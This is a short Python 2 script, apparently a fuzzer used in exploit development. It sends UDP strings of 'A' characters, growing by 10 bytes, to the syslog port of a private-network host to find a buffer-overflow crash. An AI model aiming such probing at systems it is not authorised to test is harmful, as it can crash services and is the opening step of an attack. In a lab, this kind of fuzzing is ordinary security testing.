#!/usr/bin/python

import socket, time

buffer = ["A"]
counter = 10 
while len(buffer) <=20:
	buffer.append("A" * counter)
	counter = counter + 10

for strings in buffer:
	time.sleep(1)
	print "Buffer : %s byte" % len(strings)
	s=socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('192.168.2.13', 514))
	s.send(strings)
	s.close
	
 
